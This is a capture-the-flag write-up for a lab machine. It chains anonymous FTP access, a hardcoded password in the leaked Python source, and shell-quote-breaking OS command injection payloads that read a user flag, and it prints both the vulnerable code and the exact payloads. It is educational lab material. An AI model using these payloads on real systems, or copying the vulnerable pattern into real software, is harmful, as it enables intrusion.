# Write-up : Challenge "Gotham Hotline"

**Target**: `10.10.0.17`

**Objective**: Get `user.txt`

**Difficulty**: Easy

**Date**: 21/09/2026

**Techniques used**: Network reconnaissance, anonymous FTP exploitation, source code analysis, OS command injection

**Tools used**: nmap, ftp, nc, python3

---

## 1. Network reconnaissance (Nmap)

**Command:**

```bash
nmap -sC -sV -p- -T4 10.10.0.17
```

**Why:** the first systematic step of any pentest/CTF -> identify the services exposed on the target machine to know where to get in.

**Result:** 3 open ports

| Port     | Service        | Details                                                            |
| -------- | -------------- | ------------------------------------------------------------------ |
| 21/tcp   | FTP            | vsftpd 3.0.5: anonymous login allowed                               |
| 22/tcp   | SSH            | OpenSSH 10.0p2 Debian                                              |
| 3000/tcp | Custom service | "Gotham Hotline", banner `🦇 Gotham Hotline: Identify yourself.`   |

---

## 2. Anonymous FTP exploitation

**Vulnerability exploited:** Unrestricted anonymous FTP access (CWE-284: Improper Access Control) -> service misconfiguration allowing anonymous authentication.

```bash
ftp 10.10.0.17
```

Then in the ftp session:

```
Name: anonymous
Password: [empty]
ls -la
get alert.py
cd logs
ls
quit
```

**Why it worked:** the FTP server accepted anonymous connections, exposing a Python script (`alert.py`) as well as a `logs/` folder with **777 permissions (writable by everyone)**.

**Files/folders found:**

- `alert.py` = source code of the service running on port 3000
- `logs/` = writable folder, containing `report.txt`

---

## 3. Source code analysis (`alert.py`)

```python
#!/usr/bin/env python3
import os, socket, time

HOST = "0.0.0.0"
PORT = 3000

def handle_client(conn, addr):
    conn.send("🦇 Gotham Hotline: Identify yourself.\n$> ".encode("utf-8"))
    data = conn.recv(1024).strip().decode()

    if data == "G0th4mN33dsTh3B4t!":
        conn.send(b'Authorized signal. What is the emergency?\n$> ')
        alert_text = conn.recv(1024).strip().decode()
        os.system("bash -c 'echo %s > /opt/hotline/logs/report.txt'" % alert_text)
        conn.send(b"Alert received. Mobilizing Knightfall Protocol.\n")
    else:
        conn.send(b"Unauthorized signal. Transmission terminated.\n")
```

**Vulnerabilities identified:**

| #   | Vulnerability                                                             | Type / Category                                      |
| --- | -------------------------------------------------------------------------- | ----------------------------------------------------- |
| 1   | Anonymous FTP + `logs` folder writable by everyone                        | Misconfiguration / access control (CWE-284)            |
| 2   | Hardcoded application password in the source code                         | Credential exposure (CWE-798)                          |
| 3   | Concatenation of user input into `os.system()` without escaping           | OS command injection (CWE-78)                          |

The password `G0th4mN33dsTh3B4t!` is in plaintext in the script, and `alert_text` is inserted as-is into a shell command between single quotes. By injecting a `'` into our input, we close the current shell quoting and can execute any arbitrary command, before reopening a single quote so that the syntax of the `bash -c '...'` command remains valid.

---

## 4. Exploitation / OS command injection

### Connecting to the service (port 3000)

```bash
nc 10.10.0.17 3000
```

### Authentication

```
G0th4mN33dsTh3B4t!
```

### Payload - locating the `user.txt` file

```
A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B
```

**Why it works:** the final command executed server-side becomes:

```bash
bash -c 'echo A'; find / -name user.txt 2>/dev/null > /opt/hotline/logs/report.txt; echo 'B > /opt/hotline/logs/report.txt'
```

The `find` executes as an independent shell command, redirecting its output to `report.txt`.

### Retrieving the result via FTP

```bash
ftp 10.10.0.17
# Name: anonymous
cd logs
get report.txt
quit
```

```bash
cat report.txt
```

**Result:**

```
/home/bruce/user.txt
```

---

## 5. Reading the flag

New connection on port 3000:

```bash
nc 10.10.0.17 3000
```

```
G0th4mN33dsTh3B4t!
```

Payload:

```
A'; cat /home/bruce/user.txt > /opt/hotline/logs/report.txt; echo 'B
```

Then

Retrieval via FTP by going into the logs folder (`cd logs`) then (`get report.txt`), then:

```bash
cat report.txt
```

**FLAG obtained:**

```
EPI{1s_8ruc3_W4yn3_84tm4n?}
```

---

## Summary of exploited vulnerabilities

| #   | Vulnerability                                                              | Type / Category (CWE)                 |
| --- | -------------------------------------------------------------------------- | -------------------------------------- |
| 1   | Anonymous FTP enabled                                                      | Broken access control (CWE-284)        |
| 2   | `logs` folder writable by everyone                                         | Excessive permissions (CWE-732)        |
| 3   | Hardcoded application password, readable via the source code retrieved over FTP | Credential exposure (CWE-798)     |
| 4   | Unfiltered concatenation in `os.system()`                                  | OS command injection (CWE-78)          |

---

## Conclusion

- **Initial access:** exploitation of anonymous FTP -> retrieval of the `alert.py` source code, revealing a hardcoded application password and a command injection vulnerability.
- **Exploitation:** authentication on the "Gotham Hotline" service (port 3000) then OS command injection via the unescaped `alert_text` input.
- **User flag:** `EPI{1s_8ruc3_W4yn3_84tm4n?}` obtained after locating then reading `/home/bruce/user.txt`.

---

## Evidences

### Flag user.txt

![Flag user.txt](Evidences/Flag%20batman's%20secret.png)
